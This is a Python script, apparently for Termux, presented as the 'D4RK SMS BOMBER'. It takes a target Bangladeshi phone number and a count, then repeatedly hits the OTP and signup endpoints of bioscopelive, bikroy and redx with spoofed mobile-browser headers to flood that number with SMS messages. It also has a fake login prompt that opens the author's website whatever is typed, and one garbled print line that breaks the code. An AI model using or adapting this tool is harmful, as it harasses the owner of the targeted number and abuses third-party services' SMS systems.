import os

print("\033[1;92mMR-D4RK (ROBOT) SYSTEM INSTALL. . . . \033[1;30m")

os.system("pkg install espeak")

print("\033[1;92mROBOT INSTALL COMPLETE \033[1;30m")

os.system('espeak -a 300 "Robot install complete"')

print("\033[1;92mUPDprint("\033[1;92mUPDATEATE CHECKING BOSS MR-D4RK IS INSTALLED THE DEVICE\033[1;30m")

os.system('espeak -a 300 "UPDATE CHECKING BOSS MR-D4RK IS INSTALLED THE DEVICE"')

os.system("git pull")

import os,requests,time

time.sleep(1)

os.system('clear')

animation = ["\033[30m[■□□□□□□□□□] 10%","\033[34m[■■□□□□□□□□] 20%", "\033[33m[■■■□□□□□□□] 30%", "\033[32m[■■■■□□□□□□] 40%", "\033[31m[■■■■■□□□□□] 50%", "\033[39m[■■■■■■□□□□] 60%", "\033[37m[■■■■■■■□□□] 70%", "\033[36m[■■■■■■■■□□] 80%", "\033[35m[■■■■■■■■■□] 90%", "\033[34m[■■■■■■■■■■] 100% \n\n\n"] 

for i in range(len(animation)):

			time.sleep(0.5)

			

attemps = 0

while attemps < 12345677901:

    username = input('\033[1;32mENTER USERNAME : ')

    password = input('\033[1;33mENTER PASSWORD : ')



    if username == 'MR' and password == 'D4RK':

        print(' \033[0;92mYou Have Successfully Logged in.')

        os.system('xdg-open https://bdtools.top/site/sofiks-bio.html')

        break

    else:

        print(' Incorrect Pass Please Try Again')

        os.system('xdg-open https://bdtools.top/site/sofiks-bio.html')

        attemps += 1

        continue

os.system('clear')







logo3=("""

\033[1;31m▗▖  ▗▖▗▄▄▖     ▗▄▄▄  ▄  ▗▖▗▄▄▖ ▗▖ ▗▖
\033[1;32m▐▛▚▞▜▌▐▌ ▐▌    ▐▌  █ █  ▐▌▐▌ ▐▌▐▌▗▞▘
\033[1;33m▐▌  ▐▌▐▛▀▚▖    ▐▌  █ ▀▀▀▜▌▐▛▀▚▖▐▛▚▖ 
\033[1;34m▐▌  ▐▌▐▌ ▐▌    ▐▙▄▄▀    ▐▌▐▌ ▐▌▐▌ ▐▌
                                                                        
\033[1;94m[+]===============================================================[+]

\033[1;94m[+]\033[1;32m               CREATED BY   :  MR-D4RK                     \033[1;94m[+]

\033[1;94m[+]\033[1;32m               ON GITHUB    :  MR-D4RK-OFFICIAL                    \033[1;94m[+]

\033[1;94m[+]\033[1;32m               TOOL VERSION :  0.1                             \033[1;94m[+]

\033[1;94m[+]\033[1;32m               NETWORK      :  4G,5G                           \033[1;94m[+]

\033[1;94m[+]\033[1;32m               TOOL STATUS  :  FREE                            \033[1;94m[+]

\033[1;94m[+]\033[1;32m               TOOL'S NAME  : D4RK SMS BOMBER     	          \033[1;94m[+]

\033[1;94m[+]\033[1;32m               FACEBOOK     :  MD SOFIKUL ISLAM                       \033[1;94m[+]

\033[1;94m[+]===============================================================[+]



""")



print(logo3)

num=input("""  \033[38;5;46mTARGET NUMBER : +880""")

amount=int(input("\n  \033[38;5;46mSMS AMOUNT : "))

headers1={

			  "authority":"www.bioscopelive.com",

			  "method":"GET",

			  "scheme":"https",

			  "accept":"*/*",

			  "accept-encoding":"gzip, deflate, br",

			  "accept-language":"en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7",

			  "if-none-match":'W/"5baf0d010507bc980255f9941283860a"',

			  "referer":"https://www.bioscopelive.com/en/login?bongoId=QPj10yOQIwI",

			  "save-data":"on",

			  "sec-ch-ua":'"Chromium";v="107", "Not=A?Brand";v="24"',

			  "sec-ch-ua-mobile":"?1",

			  "sec-ch-ua-platform":'Android',

			  "sec-fetch-dest":"empty",

			  "sec-fetch-mode":"cors",

			  "sec-fetch-site":"same-origin",

			  "user-agent":"Mozilla/5.0 (Linux; Android 10; Z28) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",

			  "x-requested-with":"XMLHttpRequest"

}

url1="https://www.bioscopelive.com/en/login/send-otp?phone=880"+num+"&operator=bd-otp"

headers2={

         "referer":"https://bikroy.com/bn/users/login?action=login&stack=webapp&redirect-url=/bn/users/login-options",

         "user-agent":"Mozilla/5.0 (Linux; Android 10; Z28) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"

}

url2="https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=0"+num

data={

  "name": num,

  "phoneNumber": num,

  "service": "redx"

}

headers3={

  "referer":"https://redx.com.bd/",

  "user-agent":"Mozilla/5.0 (Linux; Android 10; Z28) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"

}

ses=0

while amount>ses:

  sent1=requests.get(url1,headers=headers1)

  if sent1.status_code==200:

    ses+=1

    print(f"\n{ses}  \033[38;5;46m🦋⃟MR-D4RK✮⃝  𝐈𝐍𝄟⃝💥  SMS WAS SENT🐼")

  else:

    pass

  

  sent2=requests.get(url2,headers=headers2)

  if sent2.status_code==200:

    ses+=1

    print(f"\n{ses} \033[38;5;46m🦋⃟MR-D4RK✮⃝  𝐈𝐍𝄟⃝💥  SMS WAS SENT🐼")

  else:

    pass

  

  send3=requests.post("https://api.redx.com.bd/v1/user/signup",headers=headers3,data=data)

  if send3.status_code==200:

    ses+=1

    print(f"\n{ses} \033[38;5;46m🦋⃟MR-D4RK✮⃝  𝐈𝐍𝄟⃝💥  SMS WAS SENT🐼")

    

  else:

    pass

os.system("clear")

print(""" \033[1;32m



      \033[38;5;46m____  ____  _  ________

     \033[38;5;46m/ __ \/ __ \/ | / / ____/

    \033[38;5;46m/ / / / / / /  |/ / __/   

   \033[38;5;46m/ /_/ / /_/ / /|  / /___   

  \033[38;5;46m/_____/\____/_/ |_/_____/   

                            

 TNQ FOR USING OUR TOOLS 🖤

""")
